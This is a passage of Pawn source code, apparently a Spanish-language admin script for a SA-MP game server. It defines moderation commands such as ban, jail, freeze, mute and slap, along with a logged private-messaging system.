				SendClientMessageToAll(red,string);
				format(string2,sizeof(string2),"|Razón| »{EAEAEA} %s.",params[2]);
				SendClientMessageToAll(red,string2);
				SaveToFile("BanLog",string);
				SaveToFile("BanLog",string2);
				print(string);
				print(string2);
				aresetpall(player1);
				if(udb_Exists(PlayerName2(player1)) && PlayerInfo[player1][LoggedIn] == 1) dUserSetINT(PlayerName2(player1)).("banned",1);
				GetPlayerIp(player1,ip,sizeof(ip));
	            strdel(ip,strlen(ip)-2,strlen(ip));
    	        format(ip,128,"%s**",ip);
				format(ip,128,"banip %s",ip);
            	SendRconCommand(ip);
				return 1;
			} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} ID no encontrada, eres tu mismo o es un admin de nivel alto.");
		} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser administrador {0080FF}Nivel 9{EAEAEA} para usar este comando.");
	} else return SendClientMessage(playerid,red,"|Error| »{EAEAEA} Debes estar registrado para utilizar este comando.");
}

CMD:nban(playerid,params[]) {
	if(PlayerInfo[playerid][LoggedIn] == 1) {
		if(PlayerInfo[playerid][Level] >= 7 || IsPlayerAdmin(playerid)) {
		    new tmp[256], tmp2[256], Index;		tmp = strtok(params,Index), tmp2 = strtok(params,Index);
		    if(isnull(params)) return SendClientMessage(playerid, red, "|Usa| »{EAEAEA} /Nban [JugadorID] [Razón]");
			if(!strlen(tmp2)) return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Debes poner una razón.");
	    	new player1, playername[MAX_PLAYER_NAME], adminname[MAX_PLAYER_NAME], string[128], string2[128];
			player1 = strval(tmp);

		 	if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID && player1 != playerid && (PlayerInfo[player1][Level] != ServerInfo[MaxAdminLevel]) ) {
                if(PlayerInfo[player1][LoggedIn] == 1) {
				GetPlayerName(player1, playername, sizeof(playername)); GetPlayerName(playerid, adminname, sizeof(adminname));
				new year,month,day,hour,minuite,second; getdate(year, month, day); gettime(hour,minuite,second);
				CMDMessageToAdmins(playerid,"/Nban");
				new wea[250],ip[24];
                GetPlayerIp(playerid,ip,sizeof(ip));
                format(wea,sizeof(wea),"{0080FF}Jugador: {FFFFFF}%s.\
                \n{0080FF}Admin: {FFFFFF}%s.\
                \n{0080FF}Razón: {FFFFFF}%s.\
                \n{0080FF}Fecha: {FFFFFF}%i/%i/%i.\
                \n{0080FF}Ip: {FFFFFF}%s.",playername,adminname,params[2],day,month,year,ip);
                ShowPlayerDialog(player1, 8000, DIALOG_STYLE_MSGBOX, "{FF0000}BANEADO! {FFFFFF}(NOMBRE)", wea, "Aceptar", "");
				format(string,sizeof(string),"|Info| »{EAEAEA} El administrador {0080FF}%s{EAEAEA} le ha baneado el nombre a {0080FF}%s.",adminname,playername);
				SendClientMessageToAll(red,string);
				format(string2,sizeof(string2),"|Razón| »{EAEAEA} %s.",params[2]);
				SendClientMessageToAll(red,string2);
				SaveToFile("NameBanLog",string);
				SaveToFile("NameBanLog",string2);
				print(string);
				if(udb_Exists(PlayerName2(player1)) && PlayerInfo[player1][LoggedIn] == 1) dUserSetINT(PlayerName2(player1)).("banned",1);
				format(string,sizeof(string),"Baneado por el administrador %s. Reason: %s", adminname, params[2] );
				return Kick(player1);
				} else return SendClientMessage(playerid,red,"|Error| »{EAEAEA} El jugador debe estar registrado para poder banearle el nombre.");
			} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} ID no encontrada, eres tu mismo o es un admin de nivel alto.");
		} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser administrador {0080FF}Nivel 7{EAEAEA} para usar este comando.");
	} else return SendClientMessage(playerid,red,"|Error| »{EAEAEA} Debes estar registrado para utilizar este comando.");
}

CMD:nban2(playerid,params[]) {
    if(PlayerInfo[playerid][Level] >= 7 || IsPlayerAdmin(playerid)) {
	    new string[128], tmp[256], tmp2[256], Index; tmp = strtok(params,Index), tmp2 = strtok(params,Index);
	    //player1 = strval(tmp);
	    if(isnull(params)) return SendClientMessage(playerid, red, "|Usa| »{EAEAEA} /Nban2 [Cuenta]");
		if(udb_Exists(tmp)) {
            dUserSetINT(tmp).("banned",1);
		    CMDMessageToAdmins(playerid,"/Nban2");
			PlayerPlaySound(playerid,1057,0.0,0.0,0.0);
    	    format(string, sizeof(string),"|Info| »{EAEAEA} El administrador {0080FF}%s{EAEAEA} le ha baneado el nombre a {0080FF}%s.", PlayerName2(playerid), tmp);
            SaveToFile("NameBanLog",string);
			return SendClientMessageToAll(red,string);
		} else return SendClientMessage(playerid,red, "|Error| »{EAEAEA} Esa cuenta no existe.");
	} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser administrador {0080FF}Nivel 7{EAEAEA} para usar este comando.");
}

CMD:removeban(playerid,params[]) {
    if(PlayerInfo[playerid][Level] >= 9 || IsPlayerAdmin(playerid)) {
	    new string[128], tmp[256], tmp2[256], Index; tmp = strtok(params,Index), tmp2 = strtok(params,Index);
	    if(isnull(params)) return SendClientMessage(playerid, red, "|Usa| »{EAEAEA} /RemoveBan [Cuenta]");
		if(udb_Exists(tmp)) {
            dUserSetINT(tmp).("banned",0);
		    CMDMessageToAdmins(playerid,"/RemoveBan");
			PlayerPlaySound(playerid,1057,0.0,0.0,0.0);
    	    format(string, sizeof(string),"|Info| »{EAEAEA} El administrador {0080FF}%s{EAEAEA} le ha sacado el ban a {0080FF}%s.", PlayerName2(playerid), tmp);
            SaveToFile("RemoveBanLog",string);
			return SendClientMessageToAll(red,string);
		} else return SendClientMessage(playerid,red, "|Error| »{EAEAEA} Esa cuenta no existe.");
	} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser administrador {0080FF}Nivel 9{EAEAEA} para usar este comando.");
}

CMD:slap(playerid,params[]) {
	if(PlayerInfo[playerid][LoggedIn] == 1) {
		if(PlayerInfo[playerid][Level] >= 2 || IsPlayerAdmin(playerid)) {
		    new tmp[256], tmp2[256], Index;		tmp = strtok(params,Index), tmp2 = strtok(params,Index);
		    if(isnull(params)) return SendClientMessage(playerid, red, "|Usa| »{EAEAEA} /Slap [JugadorID] [Razón]");
	    	new player1, playername[MAX_PLAYER_NAME], adminname[MAX_PLAYER_NAME], string[128];
			player1 = strval(tmp);

		 	if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID && (PlayerInfo[player1][Level] != ServerInfo[MaxAdminLevel]) ) {
				GetPlayerName(player1, playername, sizeof(playername));		GetPlayerName(playerid, adminname, sizeof(adminname));
				CMDMessageToAdmins(playerid,"/Slap");
		        new Float:Health, Float:x, Float:y, Float:z; GetPlayerHealth(player1,Health); SetPlayerHealth(player1,Health-25);
				GetPlayerPos(player1,x,y,z); SetPlayerPos(player1,x,y,z+5); PlayerPlaySound(playerid,1190,0.0,0.0,0.0); PlayerPlaySound(player1,1190,0.0,0.0,0.0);

				if(strlen(tmp2)) {
					format(string,sizeof(string),"|Info| »{EAEAEA} Has sido levantado por el administrador {0080FF}%s.",adminname,params[2]);	SendClientMessage(player1,red,string);
					format(string,sizeof(string),"|Razón| »{EAEAEA} %s.",params[2] ); SendClientMessage(player1,red,string);
					format(string,sizeof(string),"|Info| »{EAEAEA} Has levantado a {0080FF}%s.", playername ); return SendClientMessage(playerid,red,string);
				} else {
					format(string,sizeof(string),"|Info| »{EAEAEA} Has sido levantado por el administrador {0080FF}%s.",adminname);	SendClientMessage(player1,red,string);
					format(string,sizeof(string),"|Info| »{EAEAEA} Has levantado a {0080FF}%s.",playername); return SendClientMessage(playerid,red,string); }
			} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} ID no encontrada, eres tu mismo o es un admin de nivel alto.");
		} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser administrador {0080FF}Nivel 2{EAEAEA} para usar este comando.");
	} else return SendClientMessage(playerid,red,"|Error| »{EAEAEA} Debes estar registrado para usar este comandos.");
}

CMD:explode(playerid,params[]) {
    AntiFlood[playerid] = false;
	if(PlayerInfo[playerid][LoggedIn] == 1) {
		if(PlayerInfo[playerid][Level] >= 1 || IsPlayerAdmin(playerid)) {
		    new tmp[256], tmp2[256], Index;		tmp = strtok(params,Index), tmp2 = strtok(params,Index);
		    if(isnull(params)) return SendClientMessage(playerid, red, "|Usa| »{EAEAEA} /Explode [JugadorID] [Razón]");
	    	new player1, playername[MAX_PLAYER_NAME], adminname[MAX_PLAYER_NAME], string[128];
			player1 = strval(tmp);

		 	if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID && (PlayerInfo[player1][Level] != ServerInfo[MaxAdminLevel]) ) {
				GetPlayerName(player1, playername, sizeof(playername)); 	GetPlayerName(playerid, adminname, sizeof(adminname));
				CMDMessageToAdmins(playerid,"/Explode");
				new Float:burnx, Float:burny, Float:burnz; GetPlayerPos(player1,burnx, burny, burnz); CreateExplosion(burnx, burny , burnz, 7,10.0);

				if(strlen(tmp2)) {
					//format(string,sizeof(string),"|Info| »{FFFFFF} Has sido explotado por el administrador {0080FF}%s{FFFFFF}",adminname ); SendClientMessage(player1,red,string);
					//format(string,sizeof(string),"|Razón| »{FFFFFF} %s.",params[2] ); SendClientMessage(player1,red,string);
					format(string,sizeof(string),"|Info| »{EAEAEA} Has explotado a {0080FF}%s.", playername ); return SendClientMessage(playerid,red,string);
				} else {
				     //format(string,sizeof(string),"|Info| »{FFFFFF} Has sido explotado por el administrador {0080FF}%s{FFFFFF}",adminname); SendClientMessage(player1,red,string);
					 format(string,sizeof(string),"|Info| »{EAEAEA} Has explotado a {0080FF}%s{EAEAEA}", playername); return SendClientMessage(playerid,red,string); }
			} else return SendClientMessage(playerid, red, "|Error| »{FFFFFF} ID no encontrada o es un admin de nivel alto.");
		} else return SendClientMessage(playerid, red, "|Error| »{FFFFFF} Necesitas ser administrador {0080FF}Nivel 1{EAEAEA} para usar este comando.");
	} else return SendClientMessage(playerid,red,"|Error| »{EAEAEA} Debes estar registrado para usar este comandos.");
}

CMD:unjail(playerid,params[]) {
	if(PlayerInfo[playerid][LoggedIn] == 1) {
		if(PlayerInfo[playerid][Level] >= 3 || IsPlayerAdmin(playerid)) {
		    new tmp[256], Index; tmp = strtok(params,Index);
		    if(isnull(params)) return SendClientMessage(playerid, red, "|Usa| »{EAEAEA} /UnJail [JugadorID]");
	    	new player1, playername[MAX_PLAYER_NAME], adminname[MAX_PLAYER_NAME], string[128];
			player1 = strval(tmp);

		 	if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID && (PlayerInfo[player1][Level] != ServerInfo[MaxAdminLevel]) ) {
				if(PlayerInfo[player1][Jailed] == 1) {
					GetPlayerName(player1, playername, sizeof(playername)); GetPlayerName(playerid, adminname, sizeof(adminname));
					format(string,sizeof(string),"|Info| »{EAEAEA} El administrador {0080FF}%s{EAEAEA} te ha sacado de la carcel.",adminname);	SendClientMessage(player1,red,string);
					format(string,sizeof(string),"|Info| »{EAEAEA} El administrador {0080FF}%s{EAEAEA} ha sacado de la carcel a {0080FF}%s.",adminname, playername);
					JailRelease(player1);
					return SendClientMessageToAll(red,string);
				} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} El jugador no esta en la carcel.");
			} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} ID no encontrada o es un admin de nivel alto.");
		} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser administrador {0080FF}Nivel 3{EAEAEA} para usar este comando.");
	} else return SendClientMessage(playerid,red,"|Error| »{EAEAEA} Debes estar registrado para utilizar este comando.");
}

CMD:jail(playerid,params[]) {
	if(PlayerInfo[playerid][LoggedIn] == 1) {
		if(PlayerInfo[playerid][Level] >= 3 || IsPlayerAdmin(playerid)) {
		    new tmp[256], tmp2[256], tmp3[256], Index; tmp = strtok(params,Index), tmp2 = strtok(params,Index), tmp3 = strtok(params,Index);
		    if(isnull(params)) return SendClientMessage(playerid, red, "|Usa| »{EAEAEA} /Jail [JugadorID] [Minutos] [Razón]");
		    if(isnull(tmp2)) return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Debes poner los minutos [1-99].");
		    if(isnull(tmp3)) return SendClientMessage(playerid, red, "ERROR]:{EAEAEA} Debes poner una razón.");
	    	new player1, playername[MAX_PLAYER_NAME], adminname[MAX_PLAYER_NAME], string[150], string2[128];
			player1 = strval(tmp);

		 	if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID && (PlayerInfo[player1][Level] != ServerInfo[MaxAdminLevel]) ) {
				if(PlayerInfo[player1][Jailed] == 0) {
					GetPlayerName(player1, playername, sizeof(playername)); GetPlayerName(playerid, adminname, sizeof(adminname));
					new jtime = strval(tmp2);
					if(jtime == 0) jtime = 9999;

			       	CMDMessageToAdmins(playerid,"/Jail");
					PlayerInfo[player1][LJailTime] = jtime*1000*60;
    			    SetTimerEx("JailPlayer",5000,0,"d",player1);
		    	    SetTimerEx("Jail1",1000,0,"d",player1);
		        	PlayerInfo[player1][Jailed] = 1;
		        	JailTime[player1] = jtime*60;

                    if(jtime == 9999) {
						if(!params[2]) format(string,sizeof(string),"|Info| »{EAEAEA} El administrador {0080FF}%s{EAEAEA} ha encarcelado a {0080FF}%s.",adminname, playername);
						else format(string,sizeof(string),"|Info| »{EAEAEA} El administrador {0080FF}%s{EAEAEA} ha encarcelado a {0080FF}%s.",adminname, playername);
	   				} else {
						if(!params[3+1]) format(string,sizeof(string),"|Info| »{EAEAEA} El administrador {0080FF}%s{EAEAEA} ha encarcelado a {0080FF}%s{EAEAEA} por %d minutos.",adminname, playername, jtime);
						else format(string,sizeof(string),"|Info| »{EAEAEA} El administrador {0080FF}%s{EAEAEA} ha encarcelado a {0080FF}%s{EAEAEA} por %d minutos.",adminname, playername, jtime);
                        SendClientMessageToAll(red, string);
						format(string2, 1000, "|Razón| »{EAEAEA} %s.", params[strlen(tmp2)+strlen(tmp)+1]);
                        SendClientMessageToAll(red, string2);
					}
		    		return 1;
				} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} El jugador ya esta en la carcel.");
			} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} ID no encontrada o es un admin de nivel alto.");
		} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser administrador {0080FF}Nivel 3{EAEAEA} para usar este comando.");
	} else return SendClientMessage(playerid,red,"|Error| »{EAEAEA} Debes estar registrado para usar este comandos.");
}



CMD:freeze(playerid,params[]) {
	if(PlayerInfo[playerid][LoggedIn] == 1) {
		if(PlayerInfo[playerid][Level] >= 3 || IsPlayerAdmin(playerid)) {
		    new tmp[256], tmp2[256], tmp3[256], Index; tmp = strtok(params,Index), tmp2 = strtok(params,Index), tmp3 = strtok(params,Index);
		    if(isnull(params)) return SendClientMessage(playerid, red, "|Usa| »{EAEAEA} /Freeze [JugadorID] [Minutos] [Razón]");
		    if(isnull(tmp2)) return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Debes poner los minutos [1-99].");
		    if(isnull(tmp3)) return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Debes poner una razón.");
	    	new player1, playername[MAX_PLAYER_NAME], adminname[MAX_PLAYER_NAME], string[150], string2[128];
			player1 = strval(tmp);

            if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID && (PlayerInfo[player1][Level] != ServerInfo[MaxAdminLevel]) ) {
				if(PlayerInfo[player1][Frozen] == 0) {
					GetPlayerName(player1, playername, sizeof(playername)); GetPlayerName(playerid, adminname, sizeof(adminname));
					new ftime = strval(tmp2);
					if(ftime == 0) ftime = 9999;

			       	CMDMessageToAdmins(playerid,"/Freeze");
					TogglePlayerControllable(player1,false); PlayerInfo[player1][Frozen] = 1; PlayerPlaySound(player1,1057,0.0,0.0,0.0);
					PlayerInfo[player1][FreezeTime] = ftime*1000*60;
			        FreezeTimer[player1] = SetTimerEx("UnFreezeMe",PlayerInfo[player1][FreezeTime],0,"d",player1);

                    if(ftime == 9999) {
						if(!params[2]) format(string,sizeof(string),"|Info| »{EAEAEA} El administrador {0080FF}%s{EAEAEA} ha congelado a {0080FF}%s.",adminname, playername);
						else format(string,sizeof(string),"|Info| »{EAEAEA} El administrador {0080FF}%s{EAEAEA} ha congelado a {0080FF}%s.",adminname, playername);
	   				} else {
						if(!params[3+1]) format(string,sizeof(string),"|Info| »{FFFFFF} El administrador {0080FF}%s{EAEAEA} ha congelado a {0080FF}%s{EAEAEA} por %d minutos.",adminname, playername, ftime);
						else format(string,sizeof(string),"|Info| »{EAEAEA} El administrador {0080FF}%s{EAEAEA} ha congelado a {0080FF}%s{EAEAEA} por %d minutos.",adminname, playername, ftime);
                        SendClientMessageToAll(red, string);
						format(string2, 1000, "|Razón| »{EAEAEA} %s.", params[strlen(tmp2)+strlen(tmp)+1] );
                        SendClientMessageToAll(red, string2);
					}
		    		return 1;
				} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} El jugador ya esta congelado.");
			} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} ID no encontrada o es un admin de nivel alto.");
		} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser administrador {0080FF}Nivel 3{EAEAEA} para usar este comando.");
	} else return SendClientMessage(playerid,red,"|Error| »{EAEAEA} Debes estar registrado para usar este comandos.");
}


CMD:unfreeze(playerid,params[]) {
	if(PlayerInfo[playerid][LoggedIn] == 1) {
	    if(PlayerInfo[playerid][Level] >= 3 || IsPlayerAdmin(playerid)) {
		    if(isnull(params)) return SendClientMessage(playerid, red, "|Usa| »{EAEAEA} /UnFreeze [JugadorID]");
	    	new player1, string[128];
			player1 = strval(params);

            if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID && (PlayerInfo[player1][Level] != ServerInfo[MaxAdminLevel]) ) {
		 	    if(PlayerInfo[player1][Frozen] == 1) {
			       	CMDMessageToAdmins(playerid,"/UnFreeze");
					UnFreezeMe(player1);
					format(string,sizeof(string),"|Info| »{EAEAEA} El administrador {0080FF}%s{EAEAEA} te ha descongelado.", PlayerName2(playerid) ); SendClientMessage(player1,red,string);
					format(string,sizeof(string),"|Info| »{EAEAEA} El administrador {0080FF}%s{EAEAEA} ha descongelado a {0080FF}%s.", PlayerName2(playerid), PlayerName2(player1));
		    		return SendClientMessageToAll(red,string);
				} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} El jugador no esta congelado.");
			} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} ID no encontrada o es un admin de nivel alto.");
		} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser administrador {0080FF}Nivel 3{EAEAEA} para usar este comando.");
	} else return SendClientMessage(playerid,red,"|Error| »{EAEAEA} Debes estar registrado para usar este comandos.");
}

CMD:mute(playerid,params[]) {
	if(PlayerInfo[playerid][LoggedIn] == 1) {
		if(PlayerInfo[playerid][Level] >= 2 || IsPlayerAdmin(playerid)) {
		    new tmp[256], tmp2[256], Index;		tmp = strtok(params,Index), tmp2 = strtok(params,Index);
		    if(isnull(params)) return SendClientMessage(playerid, red, "|Usa| »{EAEAEA} /Mute [JugadorID] [Razón]");
	    	new player1, playername[MAX_PLAYER_NAME], adminname[MAX_PLAYER_NAME], string[128];
			player1 = strval(tmp);

		 	if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID && (PlayerInfo[player1][Level] != ServerInfo[MaxAdminLevel]) ) {
		 	    if(PlayerInfo[player1][Muted] == 0) {
					GetPlayerName(player1, playername, sizeof(playername)); 	GetPlayerName(playerid, adminname, sizeof(adminname));
					CMDMessageToAdmins(playerid,"/Mute");
					PlayerPlaySound(player1,1057,0.0,0.0,0.0);  PlayerInfo[player1][Muted] = 1; PlayerInfo[player1][MuteWarnings] = 0;

					if(strlen(tmp2)) {
					format(string,sizeof(string),"|Info| »{EAEAEA} El administrador {0080FF}%s{EAEAEA} ha prohibido que escribas.",adminname ); SendClientMessage(player1,red,string);
					format(string,sizeof(string),"|Razón| »{EAEAEA} %s.",params[2] ); SendClientMessage(player1,red,string);
					format(string,sizeof(string),"|Info| »{EAEAEA} Le has prohibido escribir a {0080FF}%s.", playername); return SendClientMessage(playerid,red,string);
					} else {
						format(string,sizeof(string),"|Info| »{EAEAEA} El administrador {0080FF}%s{EAEAEA} ha prohibido que escribas.",adminname); SendClientMessage(player1,red,string);
						format(string,sizeof(string),"|Info| »{EAEAEA} Le has prohibido escribir a {0080FF}%s.", playername); return SendClientMessage(playerid,red,string); }
				} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} El jugador ya esta silenciado.");
			} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} ID no encontrada o es un admin de nivel alto.");
		} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser administrador {0080FF}Nivel 2{EAEAEA} para usar este comando.");
	} else return SendClientMessage(playerid,red,"|Error| »{EAEAEA} Debes estar registrado para usar este comandos.");
}

CMD:unmute(playerid,params[]) {
	if(PlayerInfo[playerid][LoggedIn] == 1) {
		if(PlayerInfo[playerid][Level] >= 2 || IsPlayerAdmin(playerid)) {
		    if(isnull(params)) return SendClientMessage(playerid, red, "|Usa| »{EAEAEA} /UnMute [JugadorID]");
	    	new player1, playername[MAX_PLAYER_NAME], adminname[MAX_PLAYER_NAME], string[128];
			player1 = strval(params);

		 	if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID && (PlayerInfo[player1][Level] != ServerInfo[MaxAdminLevel]) ) {
		 	    if(PlayerInfo[player1][Muted] == 1) {
					GetPlayerName(player1, playername, sizeof(playername)); 	GetPlayerName(playerid, adminname, sizeof(adminname));
					CMDMessageToAdmins(playerid,"/UnMute");
					PlayerPlaySound(player1,1057,0.0,0.0,0.0);  PlayerInfo[player1][Muted] = 0; PlayerInfo[player1][MuteWarnings] = 0;
					format(string,sizeof(string),"|Info| »{EAEAEA} El administrador {0080FF}%s{EAEAEA} te ha sacado la prohibición de escribir.",adminname); SendClientMessage(player1,red,string);
					format(string,sizeof(string),"|Info| »{EAEAEA} Le has sacado la prohibición de escribir a {0080FF}%s.", playername); return SendClientMessage(playerid,red,string);
				} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} El jugador no esta silenciado.");
			} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} ID no encontrada o es un admin de nivel alto.");
		} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser administrador {0080FF}Nivel 2{EAEAEA} para usar este comando.");
	} else return SendClientMessage(playerid,red,"|Error| »{EAEAEA} Debes estar registrado para usar este comandos.");
}

CMD:akill(playerid,params[]) {
	if(PlayerInfo[playerid][LoggedIn] == 1) {
	    if(PlayerInfo[playerid][Level] >= 4|| IsPlayerAdmin(playerid)) {
		    if(isnull(params)) return SendClientMessage(playerid, red, "|Usa| »{EAEAEA} /Akill [JugadorID]");
	    	new player1, playername[MAX_PLAYER_NAME], adminname[MAX_PLAYER_NAME], string[128];
			player1 = strval(params);

		 	if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID) {
				//if( (PlayerInfo[player1][Level] == ServerInfo[MaxAdminLevel] && PlayerInfo[playerid][Level] != ServerInfo[MaxAdminLevel] ) )
				//return SendClientMessage(playerid, red, "You cannot akill the highest level admin");
				CMDMessageToAdmins(playerid,"/Akill");
				GetPlayerName(player1, playername, sizeof(playername));	GetPlayerName(playerid, adminname, sizeof(adminname));
				//format(string,sizeof(string),"|Info| »{FFFFFF} El administrador {0080FF}%s{FFFFFF} te ha matado.",adminname);	SendClientMessage(player1,red,string);
				format(string,sizeof(string),"|Info| »{EAEAEA} Mataste a {0080FF}%s.",playername); SendClientMessage(playerid,red,string);
				return SetPlayerHealth(player1,0.0);
			} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} ID no encontrada.");
		} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser administrador {0080FF}Nivel 4{EAEAEA} para usar este comando.");
	} else return SendClientMessage(playerid,red,"|Error| »{EAEAEA} Debes estar registrado para usar este comandos.");
}

CMD:weaps(playerid,params[]) {
    if(PlayerInfo[playerid][Level] >= 3 || IsPlayerAdmin(playerid)) {
	    if(isnull(params)) return SendClientMessage(playerid, red, "|Usa| »{EAEAEA} /Weaps [JugadorID]");
    	new player1, string[128], string2[64], WeapName[24], slot, weap, bala, Count, x;
		player1 = strval(params);

	 	if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID) {
			format(string2,sizeof(string2),"[>> Armas de %s(%d) <<]", PlayerName2(player1), player1); SendClientMessage(playerid,COLOR_WHITE,string2);
			for (slot = 0; slot < 14; slot++) {	GetPlayerWeaponData(player1, slot, weap, bala); if( bala != 0 && weap != 0) Count++; }
			if(Count < 1) return SendClientMessage(playerid,red,"|Error| »{EAEAEA} El jugador no tiene armas.");

			if(Count >= 1)
			{
				for (slot = 0; slot < 14; slot++)
				{
					GetPlayerWeaponData(player1, slot, weap, bala);
					if( bala != 0 && weap != 0)
					{
						GetWeaponName(weap, WeapName, sizeof(WeapName) );
						if(bala == 65535 || bala == 1) format(string,sizeof(string),"%s%s (1)",string, WeapName );
						else format(string,sizeof(string),"%s%s (%d)",string, WeapName, bala );
						x++;
						if(x >= 5)
						{
						    SendClientMessage(playerid, blue, string);
						    x = 0;
							format(string, sizeof(string), "");
						}
						else format(string, sizeof(string), "%s,  ", string);
					}
			    }
				if(x <= 4 && x > 0) {
					string[strlen(string)-3] = '.';
				    SendClientMessage(playerid, blue, string);
				}
		    }
		    return 1;
		} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} ID no encontrada.");
	} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser administrador {0080FF}Nivel 3{FFFFFF} para usar este comando.");
}

CMD:aka(playerid,params[]) {
    if(PlayerInfo[playerid][Level] >= 7 || IsPlayerAdmin(playerid)) {
	    if(isnull(params)) return SendClientMessage(playerid, red, "|Usa| »{EAEAEA} /Aka [JugadorID]");
    	new player1, playername[MAX_PLAYER_NAME], str[128], tmp3[50];
		player1 = strval(params);
	 	if(IsPlayerConnected(player1) && player1 != INVALID_PLAYER_ID) {
            CMDMessageToAdmins(playerid,"/Aka");
  		  	GetPlayerIp(player1,tmp3,50);
			GetPlayerName(player1, playername, sizeof(playername));
		    format(str,sizeof(str),"AKA: [%s id:%d] [%s] %s", playername, player1, tmp3, dini_Get("ladmin/config/aka.txt",tmp3) );
	        return SendClientMessage(playerid,blue,str);
		} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} ID no encontrada.");
	} else return SendClientMessage(playerid, red, "|Error| »{EAEAEA} Necesitas ser administrador {0080FF}Nivel 7{EAEAEA} para usar este comando.");
}

CMD:pm(playerid,params[])
{
	new id;
	new mensage[256];
	new namax[MAX_PLAYERS];
	new namax2[MAX_PLAYERS];
	new idx, pid[256];
	new string2[200];
	new string3[250];
	pid = strtok(params, idx); mensage = strtok(params, idx);
	if(!strlen(pid) || !strlen(mensage)) return SendClientMessage(playerid,red,"|Usa| »{EAEAEA} /Pm [JugadorID] [Texto]");
	id=strval(pid);
	if(id == playerid) return SendClientMessage(playerid, red, "|Error| »{EAEAEA} No puedes mandarte un PM ti mismo.");
	if(DPM[id] == false)
	{
		if(IsPlayerConnected(id))
		{
			if(ServerInfo[AntiSwear] == 1 && PlayerInfo[playerid][Level] < 6)
			for(new s = 0; s < ForbiddenWordCount; s++)
			{
				new pos;
				while((pos = strfind(mensage,ForbiddenWords[s],true)) != -1) for(new i = pos, j = pos + strlen(ForbiddenWords[s]); i < j; i++) mensage[i] = '*';
			}
			GetPlayerName(playerid, namax, sizeof(namax));
			GetPlayerName(id, namax2, sizeof(namax2));
			format(string2, sizeof(string2), "{FFFF00}[PM] > %s[%d]: %s", namax2, id, params[strlen(pid)+1]);
			SendClientMessage(playerid,0xFF444499, string2);
			format(string2, sizeof(string2), "{FFD700}[PM] < %s[%d]: %s", namax, playerid, params[strlen(pid)+1]);
			SendClientMessage(id,0xFF444499,string2);
			GameTextForPlayer(id,"_~n~_~n~_~n~_~n~PM RECIVIDO",4000,6);
			PlayerPlaySound(id,1085,0.0,0.0,0.0);
			format(string3, sizeof(string3), "[PM] De %s[%d] para %s[%d]: %s", namax, playerid, namax2, id, params[strlen(pid)+1]);
			print(string3);
			SaveToFile("PmLog",string3);
			if(ServerInfo[ReadPMs] == 1 && PlayerInfo[playerid][Level] != ServerInfo[MaxAdminLevel])
			{
				format(string2, sizeof(string2), "[PM] De %s[%d] para %s[%d]: %s", namax, playerid, namax2, id, params[strlen(pid)+1]);
				for (new a = 0; a < MAX_PLAYERS; a++)
				if(IsPlayerConnected(a) && (PlayerInfo[a][Level] >= 8) && a != playerid)
				SendClientMessage(a, lightblue, string2);
			}
		}
		else SendClientMessage(playerid, red,"|Error| »{EAEAEA} ID no encontrada.");
	}
	else SendClientMessage(playerid, red,"|Error| »{EAEAEA} El jugador tiene los mensajes privados desactivados.");
	return 1;
}

CMD:dpm(playerid,params[])
{
	#pragma unused params
	if(!DPM[playerid])
	{
		SendClientMessage(playerid, red, "|Info| »{EAEAEA} Has desactivado los mensajes privados.");
		DPM[playerid] = true;
	}
	else
	{
		SendClientMessage(playerid, red, "|Info| »{EAEAEA} Has desactivado los mensajes privados.");
		return 1;
	}
	return 1;
}

CMD:apm(playerid,params[])
{
	#pragma unused params
	if(IsPlayerConnected(playerid))
	{
		if(DPM[playerid])
		{
			SendClientMessage(playerid, red, "|Info| »{EAEAEA} Has activado los mensajes privados.");
			DPM[playerid] = false;
		}
		else
		{
			SendClientMessage(playerid, red,"|Info| »{EAEAEA} Has activado los mensajes privados.");
		}
	}
	return 1;
}

CMD:admins(playerid,params[])
{
	#pragma unused params
	new string[500];
	new fstring[500];
	new conteo;
	for(new i=0; i<MAX_PLAYERS; i++)
	{
